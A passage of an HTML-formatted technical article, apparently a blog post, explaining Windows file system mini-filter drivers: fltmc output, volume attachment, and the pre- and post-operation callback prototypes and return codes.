&amp;nbsp; 1 &amp;nbsp; &amp;nbsp; &amp;nbsp; 135000 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;npsvctrig &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 1 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;46000 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;Wof &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;14 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;40700 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c12"&gt;FileInfo &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 17 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;40500 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;We can see all the mini-filters registered, the number of instances which indicates the number of volumes that&amp;rsquo;s been attached and the altitude. There are 19 volumes available for filtering in the system I tested on (according to running &lt;/span&gt;&lt;span class="c21"&gt;fltmc volumes&lt;/span&gt;&lt;span&gt;) so no filter is attached to everything. A driver can select and decide what volumes it wants to attach to by assigning an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_instance_setup_callback"&gt;instance setup callback&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the &lt;/span&gt;&lt;span class="c21"&gt;InstanceSetupCallback &lt;/span&gt;&lt;span&gt;field in the filter registration structure. This callback is invoked for every volume on the system, including new ones added after the filter starts. The callback can return the status code &lt;/span&gt;&lt;span class="c21"&gt;STATUS_FLT_DO_NOT_ATTACH&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;to block attachment. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;You can view what volumes a filter is attached to using &lt;/span&gt;&lt;span class="c21"&gt;fltmc &lt;/span&gt;&lt;span class="c1"&gt;again:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1dc2eb5eb209606302750e4e5786f0e39d755507"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;C:\&amp;gt; &lt;/span&gt;&lt;span class="c30 c50"&gt;fltmc instances -f luafv&lt;/span&gt;&lt;/p&gt;&lt;p class="c7 c8"&gt;&lt;span class="c12"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;Instances for luafv filter:&lt;/span&gt;&lt;/p&gt;&lt;p class="c7 c8"&gt;&lt;span class="c12"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;Volume Name &amp;nbsp; &amp;nbsp; Altitude &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Instance Name &amp;nbsp; &amp;nbsp; &amp;nbsp; Frame &amp;nbsp;VlStatus&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c12"&gt;------------- ------------ &amp;nbsp;---------------------- &amp;nbsp;----- &amp;nbsp;--------&lt;/span&gt;&lt;/p&gt;&lt;p class="c7"&gt;&lt;span class="c17"&gt;C: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 135000 &amp;nbsp; &amp;nbsp; luafv &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;This just shows the volume that LUAFV is attached to. As UAC virtualization only makes sense in the context of the system drive then it&amp;rsquo;s only attached to &lt;/span&gt;&lt;span class="c21"&gt;C:&lt;/span&gt;&lt;span&gt;. You can manually attach and detach filters on volumes using the &lt;/span&gt;&lt;span class="c21"&gt;fltmc &lt;/span&gt;&lt;span&gt;tool with the &lt;/span&gt;&lt;span class="c21"&gt;attach &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class="c21"&gt;detach&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;commands, we&amp;rsquo;ll show an example of using these commands later.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c21 c52"&gt;NOTE: Just because a filter driver is attached to a volume it doesn&amp;rsquo;t mean it&amp;rsquo;ll filter any IO requests for that volume. For example, the WOF driver is attached to all NTFS volumes, however it&amp;rsquo;ll only enable itself if there&amp;rsquo;s at least one file in the volume which is registered to be handled by WOF. Otherwise it ignores the IO request, letting it complete normally.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c52 c21"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;Most mini-filters only attach to file system volumes. However, the filter manager also supports attaching to the named pipe and mailslot devices. The filter driver indicates support by setting the &lt;/span&gt;&lt;span class="c21"&gt;FLTFL_REGISTRATION_SUPPORT_NPFS_MSFS&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag in the &lt;/span&gt;&lt;span class="c21"&gt;FLT_REGISTRATION&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c55" id="h.u6ec30oappt0"&gt;&lt;span&gt;Mini-Filter IO Request Operation Callbacks&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0"&gt;&lt;span&gt;By far the most important field in the &lt;/span&gt;&lt;span class="c21"&gt;FLT_REGISTRATION&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure is &lt;/span&gt;&lt;span class="c21"&gt;OperationRegistration&lt;/span&gt;&lt;span&gt;&amp;nbsp;which references a list of &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_operation_registration"&gt;FLT_OPERATION_REGISTRATION&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structures defining the IO request callbacks. Each entry contains the IRP major code for the operation (such as &lt;/span&gt;&lt;span class="c21"&gt;IRP_MJ_CREATE&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c21"&gt;IRP_MJ_FILE_SYSTEM_CONTROL&lt;/span&gt;&lt;span&gt;) and can have a pre-request and post-request callback. The driver doesn&amp;rsquo;t need to specify both if it doesn&amp;rsquo;t need both. The list is &lt;/span&gt;&lt;span&gt;a variable length &lt;/span&gt;&lt;span&gt;array, terminated with the major code being set to &lt;/span&gt;&lt;span class="c21"&gt;IRP_MJ_OPERATION_END&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;(0x80). Any operation not in the list is handled by the filter manager which typically just ignores it and continues to the next filter in the list. A basic example of what you might see in C code is shown below.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cc28d7dd0ec24da816c16ef2cb99fd8edd02c625"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c4 c54"&gt;const&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;FLT_OPERATION_REGISTRATION Callbacks&lt;/span&gt;&lt;span class="c9"&gt;[]&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;=&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9 c40"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;IRP_MJ_CREATE&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c4 c36"&gt;0&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; PreCreateOperation&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; PostCreateOperation &lt;/span&gt;&lt;span class="c9 c40"&gt;},&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;{&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;IRP_MJ_OPERATION_END &lt;/span&gt;&lt;span class="c9 c40"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_pre_operation_callback"&gt;pre-request callback&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;accepts three parameters:&lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c70 lst-kix_j703njnsekbb-0 start"&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span&gt;The parameters for the operation, specified in a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_callback_data"&gt;FLT_CALLBACK_DATA&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span&gt;Related kernel objects, in a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects"&gt;FLT_RELATED_OBJECTS&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;An output pointer which can be assigned a callback context.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;The prototype of the callback function pointer is:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8c5b0e7083051bb7cfeeb4d3608e79d073d26ab9"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c32 c23"&gt;typedef&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;FLT_PREOP_CALLBACK_STATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;(*&lt;/span&gt;&lt;span class="c4"&gt;PFLT_PRE_OPERATION_CALLBACK&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_CALLBACK_DATA Data&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PCFLT_RELATED_OBJECTS FltObjects&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PVOID &lt;/span&gt;&lt;span class="c9"&gt;*&lt;/span&gt;&lt;span class="c30 c4"&gt;CompletionContext&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The parameters for the IO request are accessible in the &lt;/span&gt;&lt;span class="c21"&gt;FLT_CALLBACK_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure&amp;rsquo;s &lt;/span&gt;&lt;span class="c21"&gt;Iopb&lt;/span&gt;&lt;span&gt;&amp;nbsp;field which is an &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_io_parameter_block"&gt;FLT_IO_PARAMETER_BLOCK&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure. The parameters are similar to the ones exposed through the IRP&amp;rsquo;s current &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location"&gt;IO_STACK_LOCATION&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure. The data parameter also contains the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_status_block"&gt;IO_STATUS_BLOCK&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the request and the caller&amp;rsquo;s requestor mode (either &lt;/span&gt;&lt;span class="c21"&gt;KernelMode &lt;/span&gt;&lt;span&gt;or &lt;/span&gt;&lt;span class="c21"&gt;UserMode&lt;/span&gt;&lt;span&gt;). The return code from the pre-request callback function determines what the filter driver wants to do with the request. The return type &lt;/span&gt;&lt;span class="c21"&gt;FLT_PREOP_CALLBACK_STATUS&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;can be one of the following:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.59c99c373b3896c8783a9b10b4154ac9babbf1b7"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c37 c75" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c6"&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26 c75" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c6"&gt;Value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28 c75" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c6"&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_PREOP_SUCCESS_WITH_CALLBACK&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;The callback was successful. Pass on the IO request and get a post-operation callback after completion.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_PREOP_SUCCESS_NO_CALLBACK&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;The callback was successful. Pass on the IO request. No callback required.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_PREOP_PENDING&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;Mark the IO operation as pending.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_PREOP_DISALLOW_FASTIO&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;If handling a Fast IO operation, fail it to force the operation as a normal IO Request.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_PREOP_COMPLETE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;The operation has been completed. Do not pass on the IO request to any other drivers, even other filters in the stack.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_PREOP_SYNCHRONIZE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;5&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;Synchronize the post-operation callback in the same thread.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c37" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c31"&gt;FLT_PREOP_DISALLOW_FSFILTER_IO&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c26" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;Disallow FastIO file creation.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_post_operation_callback"&gt;post-request callback&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;accepts four parameters:&lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c70 lst-kix_j703njnsekbb-0"&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span&gt;The parameters for the operation, specified in a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_callback_data"&gt;FLT_CALLBACK_DATA&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span&gt;Related kernel objects, in a &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c101" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_related_objects"&gt;FLT_RELATED_OBJECTS&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;structure.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;A context pointer which could have been assigned by the pre-operation callback.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c27 li-bullet-0"&gt;&lt;span class="c1"&gt;Additional flags.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;For post-operation callbacks the prototype is as follows:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fabf9378be1538d9055ef14c3362b4744b65cf48"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c82"&gt;&lt;td class="c44" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c32 c23"&gt;typedef&lt;/span&gt;&lt;span class="c30 c4"&gt;&amp;nbsp;FLT_POSTOP_CALLBACK_STATUS&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;(*&lt;/span&gt;&lt;span class="c4"&gt;PFLT_POST_OPERATION_CALLBACK&lt;/span&gt;&lt;span class="c9"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9 c40"&gt;(&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PFLT_CALLBACK_DATA Data&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PCFLT_RELATED_OBJECTS FltObjects&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c4"&gt;&amp;nbsp; &amp;nbsp; PVOID CompletionContext&lt;/span&gt;&lt;span class="c9 c40"&gt;,&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c30 c4"&gt;&amp;nbsp; &amp;nbsp; FLT_POST_OPERATION_FLAGS Flags&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c9"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span&gt;The parameters are more or less the same as for the pre-operation callback. The &lt;/span&gt;&lt;span class="c21"&gt;CompletionContext &lt;/span&gt;&lt;span&gt;parameter is the same one assigned in the pre-operation callback. If this value was allocated the post-operation callback needs to free the memory buffer to prevent leaking memory. The &lt;/span&gt;&lt;span class="c21"&gt;FLT_POSTOP_CALLBACK_STATUS&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;return type can be one of the following values.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c8"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e43b35613e6365457ddfbb46de9dba688a557d53"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c59 c75" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c6"&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c6"&gt;Value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c61" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c6"&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c59" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_POSTOP_FINISHED_PROCESSING&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c81" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c62" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;The callback was successful. No further processing required.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c59" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_POSTOP_MORE_PROCESSING_REQUIRED&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c81" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c62" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;Halts completion of the IO request. The operation will be pending until the filter driver completes it.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c59" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span class="c1"&gt;FLT_POSTOP_DISALLOW_FSFILTER_IO&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c81" colspan="1" rowspan="1"&gt;&lt;p class="c7"&gt;&lt;span 